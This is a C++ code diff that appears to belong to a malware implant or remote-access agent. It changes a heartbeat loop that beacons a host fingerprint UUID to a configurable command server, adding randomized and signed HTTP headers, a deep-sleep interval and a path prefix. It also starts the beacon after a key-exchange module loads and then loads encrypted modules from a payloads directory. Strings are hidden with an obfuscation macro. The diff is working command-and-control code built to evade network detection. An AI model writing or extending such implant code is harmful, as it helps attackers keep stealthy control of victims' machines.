@@ -15,13 +15,18 @@ static size_t write_cb(void* contents, size_t size, size_t nmemb, void* userp) {
 static void heartbeat(const std::string& server) {
     CURL* curl = curl_easy_init();
     if(!curl) return;
+    struct curl_slist* headers = nullptr;
     while(true) {
-        std::string url = server + OBFUSCATE("/heartbeat");
+        std::string url = server + g_agent_config.path_prefix + OBFUSCATE("/heartbeat");
         std::string payload = "{\"uuid\":\"" + g_uuid + "\"}";
+        headers = g_header_randomizer.build_list();
+        headers = g_request_signer.sign(headers, "POST", url, payload);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
         curl_easy_perform(curl);
+        curl_slist_free_all(headers);
         auto interval = g_deep_sleep.load() ? std::chrono::hours(1) : std::chrono::minutes(1);
         std::this_thread::sleep_for(interval);
     }
@@ -31,8 +36,6 @@ static void heartbeat(const std::string& server) {
 int main() {
     auto fp = collect_fingerprint();
     g_uuid = fp.uuid;
-    std::thread hb(heartbeat, OBFUSCATE("http://localhost:5000"));
-    hb.detach();
 
     Loader clearLoader(OBFUSCATE("./plugins"), "");
     clearLoader.load();
@@ -42,11 +45,16 @@ int main() {
         if(mod->name() == "KeyExchange") {
             mod->init();
             auto kx = dynamic_cast<KeyExchange*>(mod.get());
-            if(kx) aes_key = kx->aes_key();
+            if(kx) {
+                aes_key = kx->aes_key();
+            }
         } else {
             mod->init();
         }
     }
+
+    std::thread hb(heartbeat, g_agent_config.server_url);
+    hb.detach();
 
     Loader encLoader(OBFUSCATE("./payloads"), aes_key);
     encLoader.load();
